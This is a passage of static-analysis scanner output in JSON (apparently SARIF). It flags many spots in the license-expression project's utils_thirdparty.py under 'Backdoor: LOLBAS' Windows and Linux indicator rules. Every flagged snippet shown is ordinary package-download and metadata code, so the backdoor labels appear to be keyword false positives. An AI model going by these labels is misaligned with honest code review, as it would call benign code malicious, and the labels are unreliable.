                      "text": "    @classmethod\n    def packages_from_dir(cls, directory):\n        \"\"\"\n        Yield PypiPackages built from files found in at directory path.\n        \"\"\"\n        base = os.path.abspath(directory)\n\n",
                      "markdown": "`    @classmethod\n    def packages_from_dir(cls, directory):\n        \"\"\"\n        Yield PypiPackages built from files found in at directory path.\n        \"\"\"\n        base = os.path.abspath(directory)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 959,
                  "startColumn": 34,
                  "endLine": 959,
                  "endColumn": 42,
                  "snippet": {
                    "text": "            purl_from_self = packageurl.PackageURL.from_string(self.package_url)\n            if purl_from_data != purl_from_self:\n                print(\n                    f\"Invalid dist update attempt, no same same purl with dist: \"\n                    f\"{self} using data {data}.\"\n                )\n                return\n",
                    "rendered": {
                      "text": "            purl_from_self = packageurl.PackageURL.from_string(self.package_url)\n            if purl_from_data != purl_from_self:\n                print(\n                    f\"Invalid dist update attempt, no same same purl with dist: \"\n                    f\"{self} using data {data}.\"\n                )\n                return\n",
                      "markdown": "`            purl_from_self = packageurl.PackageURL.from_string(self.package_url)\n            if purl_from_data != purl_from_self:\n                print(\n                    f\"Invalid dist update attempt, no same same purl with dist: \"\n                    f\"{self} using data {data}.\"\n                )\n                return\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 948,
                  "startColumn": 7,
                  "endLine": 948,
                  "endColumn": 15,
                  "snippet": {
                    "text": "\n    def update(self, data, overwrite=False, keep_extra=True):\n        \"\"\"\n        Update self with a mapping of `data`. Keep unknown data as extra_data if\n        `keep_extra` is True. If `overwrite` is True, overwrite self with `data`\n        Return True if any data was updated, False otherwise. Raise an exception\n        if there are key data conflicts.\n",
                    "rendered": {
                      "text": "\n    def update(self, data, overwrite=False, keep_extra=True):\n        \"\"\"\n        Update self with a mapping of `data`. Keep unknown data as extra_data if\n        `keep_extra` is True. If `overwrite` is True, overwrite self with `data`\n        Return True if any data was updated, False otherwise. Raise an exception\n        if there are key data conflicts.\n",
                      "markdown": "`\n    def update(self, data, overwrite=False, keep_extra=True):\n        \"\"\"\n        Update self with a mapping of `data`. Keep unknown data as extra_data if\n        `keep_extra` is True. If `overwrite` is True, overwrite self with `data`\n        Return True if any data was updated, False otherwise. Raise an exception\n        if there are key data conflicts.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 938,
                  "startColumn": 7,
                  "endLine": 938,
                  "endColumn": 15,
                  "snippet": {
                    "text": "\n    def update_from_other_dist(self, dist):\n        \"\"\"\n        Update self using data from another dist\n        \"\"\"\n        return self.update(dist.get_updatable_data())\n\n",
                    "rendered": {
                      "text": "\n    def update_from_other_dist(self, dist):\n        \"\"\"\n        Update self using data from another dist\n        \"\"\"\n        return self.update(dist.get_updatable_data())\n\n",
                      "markdown": "`\n    def update_from_other_dist(self, dist):\n        \"\"\"\n        Update self using data from another dist\n        \"\"\"\n        return self.update(dist.get_updatable_data())\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 899,
                  "startColumn": 7,
                  "endLine": 899,
                  "endColumn": 15,
                  "snippet": {
                    "text": "\n    def load_pkginfo_data(self, dest_dir=THIRDPARTY_DIR):\n        \"\"\"\n        Update self with data loaded from the PKG-INFO file found in the\n        archive of this Distribution in `dest_dir`.\n        \"\"\"\n        pkginfo_text = self.extract_pkginfo(dest_dir=dest_dir)\n",
                    "rendered": {
                      "text": "\n    def load_pkginfo_data(self, dest_dir=THIRDPARTY_DIR):\n        \"\"\"\n        Update self with data loaded from the PKG-INFO file found in the\n        archive of this Distribution in `dest_dir`.\n        \"\"\"\n        pkginfo_text = self.extract_pkginfo(dest_dir=dest_dir)\n",
                      "markdown": "`\n    def load_pkginfo_data(self, dest_dir=THIRDPARTY_DIR):\n        \"\"\"\n        Update self with data loaded from the PKG-INFO file found in the\n        archive of this Distribution in `dest_dir`.\n        \"\"\"\n        pkginfo_text = self.extract_pkginfo(dest_dir=dest_dir)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 791,
                  "startColumn": 7,
                  "endLine": 791,
                  "endColumn": 15,
                  "snippet": {
                    "text": "\n    def set_checksums(self, dest_dir=THIRDPARTY_DIR):\n        \"\"\"\n        Update self with checksums computed for this dist filename is `dest_dir`.\n        \"\"\"\n        self.update(self.get_checksums(dest_dir), overwrite=True)\n\n",
                    "rendered": {
                      "text": "\n    def set_checksums(self, dest_dir=THIRDPARTY_DIR):\n        \"\"\"\n        Update self with checksums computed for this dist filename is `dest_dir`.\n        \"\"\"\n        self.update(self.get_checksums(dest_dir), overwrite=True)\n\n",
                      "markdown": "`\n    def set_checksums(self, dest_dir=THIRDPARTY_DIR):\n        \"\"\"\n        Update self with checksums computed for this dist filename is `dest_dir`.\n        \"\"\"\n        self.update(self.get_checksums(dest_dir), overwrite=True)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 750,
                  "startColumn": 17,
                  "endLine": 750,
                  "endColumn": 25,
                  "snippet": {
                    "text": "\n    def load_remote_about_data(self):\n        \"\"\"\n        Fetch and update self with \"remote\" data Distribution ABOUT file and\n        NOTICE file if any. Return True if the data was updated.\n        \"\"\"\n        try:\n",
                    "rendered": {
                      "text": "\n    def load_remote_about_data(self):\n        \"\"\"\n        Fetch and update self with \"remote\" data Distribution ABOUT file and\n        NOTICE file if any. Return True if the data was updated.\n        \"\"\"\n        try:\n",
                      "markdown": "`\n    def load_remote_about_data(self):\n        \"\"\"\n        Fetch and update self with \"remote\" data Distribution ABOUT file and\n        NOTICE file if any. Return True if the data was updated.\n        \"\"\"\n        try:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 705,
                  "startColumn": 7,
                  "endLine": 705,
                  "endColumn": 15,
                  "snippet": {
                    "text": "\n    def load_about_data(self, about_filename_or_data=None, dest_dir=THIRDPARTY_DIR):\n        \"\"\"\n        Update self with ABOUT data loaded from an `about_filename_or_data`\n        which is either a .ABOUT file in `dest_dir` or an ABOUT data mapping.\n        `about_filename_or_data` defaults to this distribution default ABOUT\n        filename if not provided. Load the notice_text if present from dest_dir.\n",
                    "rendered": {
                      "text": "\n    def load_about_data(self, about_filename_or_data=None, dest_dir=THIRDPARTY_DIR):\n        \"\"\"\n        Update self with ABOUT data loaded from an `about_filename_or_data`\n        which is either a .ABOUT file in `dest_dir` or an ABOUT data mapping.\n        `about_filename_or_data` defaults to this distribution default ABOUT\n        filename if not provided. Load the notice_text if present from dest_dir.\n",
                      "markdown": "`\n    def load_about_data(self, about_filename_or_data=None, dest_dir=THIRDPARTY_DIR):\n        \"\"\"\n        Update self with ABOUT data loaded from an `about_filename_or_data`\n        which is either a .ABOUT file in `dest_dir` or an ABOUT data mapping.\n        `about_filename_or_data` defaults to this distribution default ABOUT\n        filename if not provided. Load the notice_text if present from dest_dir.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 48,
                  "startColumn": 1,
                  "endLine": 48,
                  "endColumn": 9,
                  "snippet": {
                    "text": "- create, update and download ABOUT, NOTICE and LICENSE metadata for these\n  wheels and source distributions\n\n- update pip requirement files based on actually installed packages for\n  production and development\n\n\n",
                    "rendered": {
                      "text": "- create, update and download ABOUT, NOTICE and LICENSE metadata for these\n  wheels and source distributions\n\n- update pip requirement files based on actually installed packages for\n  production and development\n\n\n",
                      "markdown": "`- create, update and download ABOUT, NOTICE and LICENSE metadata for these\n  wheels and source distributions\n\n- update pip requirement files based on actually installed packages for\n  production and development\n\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 45,
                  "startColumn": 9,
                  "endLine": 45,
                  "endColumn": 17,
                  "snippet": {
                    "text": "\n- download sources for packages (aka. sdist)\n\n- create, update and download ABOUT, NOTICE and LICENSE metadata for these\n  wheels and source distributions\n\n- update pip requirement files based on actually installed packages for\n",
                    "rendered": {
                      "text": "\n- download sources for packages (aka. sdist)\n\n- create, update and download ABOUT, NOTICE and LICENSE metadata for these\n  wheels and source distributions\n\n- update pip requirement files based on actually installed packages for\n",
                      "markdown": "`\n- download sources for packages (aka. sdist)\n\n- create, update and download ABOUT, NOTICE and LICENSE metadata for these\n  wheels and source distributions\n\n- update pip requirement files based on actually installed packages for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 2166,
                  "startColumn": 3,
                  "endLine": 2166,
                  "endColumn": 8,
                  "snippet": {
                    "text": "):\n    \"\"\"\n    Fetch binary wheel(s) using pip for the ``envt`` Environment given a list of\n    pip ``requirements_files`` and a list of ``requirements_specifiers`` string\n    (such as package names or as name==version).\n    Return a tuple of (list of downloaded files, error string).\n    Do NOT fail on errors, but return an error message on failure.\n",
                    "rendered": {
                      "text": "):\n    \"\"\"\n    Fetch binary wheel(s) using pip for the ``envt`` Environment given a list of\n    pip ``requirements_files`` and a list of ``requirements_specifiers`` string\n    (such as package names or as name==version).\n    Return a tuple of (list of downloaded files, error string).\n    Do NOT fail on errors, but return an error message on failure.\n",
                      "markdown": "`):\n    \"\"\"\n    Fetch binary wheel(s) using pip for the ``envt`` Environment given a list of\n    pip ``requirements_files`` and a list of ``requirements_specifiers`` string\n    (such as package names or as name==version).\n    Return a tuple of (list of downloaded files, error string).\n    Do NOT fail on errors, but return an error message on failure.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 2165,
                  "startColumn": 31,
                  "endLine": 2165,
                  "endColumn": 36,
                  "snippet": {
                    "text": "    links_url=ABOUT_LINKS_URL,\n):\n    \"\"\"\n    Fetch binary wheel(s) using pip for the ``envt`` Environment given a list of\n    pip ``requirements_files`` and a list of ``requirements_specifiers`` string\n    (such as package names or as name==version).\n    Return a tuple of (list of downloaded files, error string).\n",
                    "rendered": {
                      "text": "    links_url=ABOUT_LINKS_URL,\n):\n    \"\"\"\n    Fetch binary wheel(s) using pip for the ``envt`` Environment given a list of\n    pip ``requirements_files`` and a list of ``requirements_specifiers`` string\n    (such as package names or as name==version).\n    Return a tuple of (list of downloaded files, error string).\n",
                      "markdown": "`    links_url=ABOUT_LINKS_URL,\n):\n    \"\"\"\n    Fetch binary wheel(s) using pip for the ``envt`` Environment given a list of\n    pip ``requirements_files`` and a list of ``requirements_specifiers`` string\n    (such as package names or as name==version).\n    Return a tuple of (list of downloaded files, error string).\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 1915,
                  "startColumn": 63,
                  "endLine": 1915,
                  "endColumn": 69,
                  "snippet": {
                    "text": "    time.sleep(_delay)\n    headers = headers or {}\n    # using a GET with stream=True ensure we get the the final header from\n    # several redirects and that we can ignore content there. A HEAD request may\n    # not get us this last header\n    print(f\"    DOWNLOADING: {url}\")\n    with requests.get(url, allow_redirects=True, stream=True, headers=headers) as response:\n",
                    "rendered": {
                      "text": "    time.sleep(_delay)\n    headers = headers or {}\n    # using a GET with stream=True ensure we get the the final header from\n    # several redirects and that we can ignore content there. A HEAD request may\n    # not get us this last header\n    print(f\"    DOWNLOADING: {url}\")\n    with requests.get(url, allow_redirects=True, stream=True, headers=headers) as response:\n",
                      "markdown": "`    time.sleep(_delay)\n    headers = headers or {}\n    # using a GET with stream=True ensure we get the the final header from\n    # several redirects and that we can ignore content there. A HEAD request may\n    # not get us this last header\n    print(f\"    DOWNLOADING: {url}\")\n    with requests.get(url, allow_redirects=True, stream=True, headers=headers) as response:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 1561,
                  "startColumn": 24,
                  "endLine": 1561,
                  "endColumn": 29,
                  "snippet": {
                    "text": "\n    def get_pip_cli_options(self):\n        \"\"\"\n        Return a list of pip download command line options for this environment.\n        \"\"\"\n        options = [\n            \"--python-version\",\n",
                    "rendered": {
                      "text": "\n    def get_pip_cli_options(self):\n        \"\"\"\n        Return a list of pip download command line options for this environment.\n        \"\"\"\n        options = [\n            \"--python-version\",\n",
                      "markdown": "`\n    def get_pip_cli_options(self):\n        \"\"\"\n        Return a list of pip download command line options for this environment.\n        \"\"\"\n        options = [\n            \"--python-version\",\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 1146,
                  "startColumn": 31,
                  "endLine": 1146,
                  "endColumn": 36,
                  "snippet": {
                    "text": "    license_expression: mit\n    notes: copied from pip-20.3.1 pip/_internal/models/wheel.py\n\n    Copyright (c) 2008-2020 The pip developers (see AUTHORS.txt file)\n\n    Permission is hereby granted, free of charge, to any person obtaining\n    a copy of this software and associated documentation files (the\n",
                    "rendered": {
                      "text": "    license_expression: mit\n    notes: copied from pip-20.3.1 pip/_internal/models/wheel.py\n\n    Copyright (c) 2008-2020 The pip developers (see AUTHORS.txt file)\n\n    Permission is hereby granted, free of charge, to any person obtaining\n    a copy of this software and associated documentation files (the\n",
                      "markdown": "`    license_expression: mit\n    notes: copied from pip-20.3.1 pip/_internal/models/wheel.py\n\n    Copyright (c) 2008-2020 The pip developers (see AUTHORS.txt file)\n\n    Permission is hereby granted, free of charge, to any person obtaining\n    a copy of this software and associated documentation files (the\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 1142,
                  "startColumn": 42,
                  "endLine": 1142,
                  "endColumn": 47,
                  "snippet": {
                    "text": "    name: pip compatibility tags\n    version: 20.3.1\n    download_url: https://github.com/pypa/pip/blob/20.3.1/src/pip/_internal/models/wheel.py\n    copyright: Copyright (c) 2008-2020 The pip developers (see AUTHORS.txt file)\n    license_expression: mit\n    notes: copied from pip-20.3.1 pip/_internal/models/wheel.py\n\n",
                    "rendered": {
                      "text": "    name: pip compatibility tags\n    version: 20.3.1\n    download_url: https://github.com/pypa/pip/blob/20.3.1/src/pip/_internal/models/wheel.py\n    copyright: Copyright (c) 2008-2020 The pip developers (see AUTHORS.txt file)\n    license_expression: mit\n    notes: copied from pip-20.3.1 pip/_internal/models/wheel.py\n\n",
                      "markdown": "`    name: pip compatibility tags\n    version: 20.3.1\n    download_url: https://github.com/pypa/pip/blob/20.3.1/src/pip/_internal/models/wheel.py\n    copyright: Copyright (c) 2008-2020 The pip developers (see AUTHORS.txt file)\n    license_expression: mit\n    notes: copied from pip-20.3.1 pip/_internal/models/wheel.py\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 1139,
                  "startColumn": 9,
                  "endLine": 1139,
                  "endColumn": 14,
                  "snippet": {
                    "text": "    Copied and heavily modified from pip-20.3.1 copied from pip-20.3.1\n    pip/_internal/models/wheel.py\n\n    name: pip compatibility tags\n    version: 20.3.1\n    download_url: https://github.com/pypa/pip/blob/20.3.1/src/pip/_internal/models/wheel.py\n    copyright: Copyright (c) 2008-2020 The pip developers (see AUTHORS.txt file)\n",
                    "rendered": {
                      "text": "    Copied and heavily modified from pip-20.3.1 copied from pip-20.3.1\n    pip/_internal/models/wheel.py\n\n    name: pip compatibility tags\n    version: 20.3.1\n    download_url: https://github.com/pypa/pip/blob/20.3.1/src/pip/_internal/models/wheel.py\n    copyright: Copyright (c) 2008-2020 The pip developers (see AUTHORS.txt file)\n",
                      "markdown": "`    Copied and heavily modified from pip-20.3.1 copied from pip-20.3.1\n    pip/_internal/models/wheel.py\n\n    name: pip compatibility tags\n    version: 20.3.1\n    download_url: https://github.com/pypa/pip/blob/20.3.1/src/pip/_internal/models/wheel.py\n    copyright: Copyright (c) 2008-2020 The pip developers (see AUTHORS.txt file)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 880,
                  "startColumn": 11,
                  "endLine": 880,
                  "endColumn": 16,
                  "snippet": {
                    "text": "        elif fn.endswith(\".tar.gz\"):\n            fmt = \"gztar\"\n        else:\n            fmt = None\n\n        dist = os.path.join(dest_dir, fn)\n        with tempfile.TemporaryDirectory(prefix=f\"pypi-tmp-extract-{fn}\") as td:\n",
                    "rendered": {
                      "text": "        elif fn.endswith(\".tar.gz\"):\n            fmt = \"gztar\"\n        else:\n            fmt = None\n\n        dist = os.path.join(dest_dir, fn)\n        with tempfile.TemporaryDirectory(prefix=f\"pypi-tmp-extract-{fn}\") as td:\n",
                      "markdown": "`        elif fn.endswith(\".tar.gz\"):\n            fmt = \"gztar\"\n        else:\n            fmt = None\n\n        dist = os.path.join(dest_dir, fn)\n        with tempfile.TemporaryDirectory(prefix=f\"pypi-tmp-extract-{fn}\") as td:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 878,
                  "startColumn": 11,
                  "endLine": 878,
                  "endColumn": 16,
                  "snippet": {
                    "text": "        if fn.endswith(\".whl\"):\n            fmt = \"zip\"\n        elif fn.endswith(\".tar.gz\"):\n            fmt = \"gztar\"\n        else:\n            fmt = None\n\n",
                    "rendered": {
                      "text": "        if fn.endswith(\".whl\"):\n            fmt = \"zip\"\n        elif fn.endswith(\".tar.gz\"):\n            fmt = \"gztar\"\n        else:\n            fmt = None\n\n",
                      "markdown": "`        if fn.endswith(\".whl\"):\n            fmt = \"zip\"\n        elif fn.endswith(\".tar.gz\"):\n            fmt = \"gztar\"\n        else:\n            fmt = None\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 876,
                  "startColumn": 11,
                  "endLine": 876,
                  "endColumn": 16,
                  "snippet": {
                    "text": "\n        fn = self.filename\n        if fn.endswith(\".whl\"):\n            fmt = \"zip\"\n        elif fn.endswith(\".tar.gz\"):\n            fmt = \"gztar\"\n        else:\n",
                    "rendered": {
                      "text": "\n        fn = self.filename\n        if fn.endswith(\".whl\"):\n            fmt = \"zip\"\n        elif fn.endswith(\".tar.gz\"):\n            fmt = \"gztar\"\n        else:\n",
                      "markdown": "`\n        fn = self.filename\n        if fn.endswith(\".whl\"):\n            fmt = \"zip\"\n        elif fn.endswith(\".tar.gz\"):\n            fmt = \"gztar\"\n        else:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 346,
                  "startColumn": 35,
                  "endLine": 346,
                  "endColumn": 41,
                  "snippet": {
                    "text": "\n    def sortable_name_version(self):\n        \"\"\"\n        Return a tuple of values to sort by name, then version.\n        This method is a suitable to use as key for sorting NameVer instances.\n        \"\"\"\n        return self.normalized_name, packaging_version.parse(self.version)\n",
                    "rendered": {
                      "text": "\n    def sortable_name_version(self):\n        \"\"\"\n        Return a tuple of values to sort by name, then version.\n        This method is a suitable to use as key for sorting NameVer instances.\n        \"\"\"\n        return self.normalized_name, packaging_version.parse(self.version)\n",
                      "markdown": "`\n    def sortable_name_version(self):\n        \"\"\"\n        Return a tuple of values to sort by name, then version.\n        This method is a suitable to use as key for sorting NameVer instances.\n        \"\"\"\n        return self.normalized_name, packaging_version.parse(self.version)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 307,
                  "startColumn": 56,
                  "endLine": 307,
                  "endColumn": 62,
                  "snippet": {
                    "text": "        fetched_sdist_filename = package.sdist.download(dest_dir=dest_dir)\n\n        if fetched_sdist_filename:\n            # do not futher fetch from other repos if we find in first, typically PyPI\n            break\n\n    return fetched_sdist_filename\n",
                    "rendered": {
                      "text": "        fetched_sdist_filename = package.sdist.download(dest_dir=dest_dir)\n\n        if fetched_sdist_filename:\n            # do not futher fetch from other repos if we find in first, typically PyPI\n            break\n\n    return fetched_sdist_filename\n",
                      "markdown": "`        fetched_sdist_filename = package.sdist.download(dest_dir=dest_dir)\n\n        if fetched_sdist_filename:\n            # do not futher fetch from other repos if we find in first, typically PyPI\n            break\n\n    return fetched_sdist_filename\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 267,
                  "startColumn": 56,
                  "endLine": 267,
                  "endColumn": 62,
                  "snippet": {
                    "text": "            fetched_wheel_filenames.append(fetched_wheel_filename)\n\n        if fetched_wheel_filenames:\n            # do not futher fetch from other repos if we find in first, typically PyPI\n            break\n\n    return fetched_wheel_filenames\n",
                    "rendered": {
                      "text": "            fetched_wheel_filenames.append(fetched_wheel_filename)\n\n        if fetched_wheel_filenames:\n            # do not futher fetch from other repos if we find in first, typically PyPI\n            break\n\n    return fetched_wheel_filenames\n",
                      "markdown": "`            fetched_wheel_filenames.append(fetched_wheel_filename)\n\n        if fetched_wheel_filenames:\n            # do not futher fetch from other repos if we find in first, typically PyPI\n            break\n\n    return fetched_wheel_filenames\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
